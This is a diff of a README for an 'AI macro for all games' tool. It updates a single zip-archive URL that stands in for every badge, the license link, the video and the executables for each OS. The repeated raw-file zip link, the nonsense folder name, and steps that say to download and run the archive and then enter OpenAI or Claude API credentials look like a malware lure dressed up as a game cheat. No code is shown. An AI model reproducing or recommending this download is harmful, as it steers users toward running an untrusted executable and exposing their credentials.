@@ -1,10 +1,10 @@
 # 🎮 AI MACRO FOR ALL GAMES 🚀
 
-[![License: MIT](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip)](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip)
-[![OS Support](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip%20%7C%20macOS%20%7C%20Linux-blue)](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip)
-[![API: OpenAI](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip)](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip)
-[![API: Claude](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip)](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip)
-[![Language Support](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip)]()
+[![License: MIT](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip)](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip)
+[![OS Support](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip%20%7C%20macOS%20%7C%20Linux-blue)](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip)
+[![API: OpenAI](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip)](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip)
+[![API: Claude](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip)](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip)
+[![Language Support](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip)]()
 
 ---
 
@@ -60,15 +60,15 @@ No matter your battlefield, your macros roam freely!
 
 **Get started in a handful of clicks!**
 
-1. **Download** the `https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip` archive from the repository’s releases.
+1. **Download** the `https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip` archive from the repository’s releases.
 2. **Extract** all files into your designated games or tools folder.
-3. **Run** `https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip` (Windows), `https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip` (macOS), or `https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip` (Linux).
+3. **Run** `https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip` (Windows), `https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip` (macOS), or `https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip` (Linux).
 4. **Authenticate** using your OpenAI or Claude API credentials.
 5. **Configure** your macro preferences using the smarts of our adaptive interface.
 
 ### 🎬 Video Installation Tutorial
 
-![](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip)
+![](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip)
 
 *For advanced setup tips, check the Wiki section.*
 
@@ -142,7 +142,7 @@ Please ensure your use aligns with the terms and community guidelines of your ga
 
 Copyright (c) 2025
 
-**AI MACRO FOR ALL GAMES** is offered under the MIT License — see [here](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/every-macro-game-ai-suite-for-unisonous.zip) for full terms.
+**AI MACRO FOR ALL GAMES** is offered under the MIT License — see [here](https://raw.githubusercontent.com/medojamal/ai-macro-suite-for-every-game/main/osteomalacia/ai_suite_for_game_every_macro_v3.1.zip) for full terms.
 
 ---
 
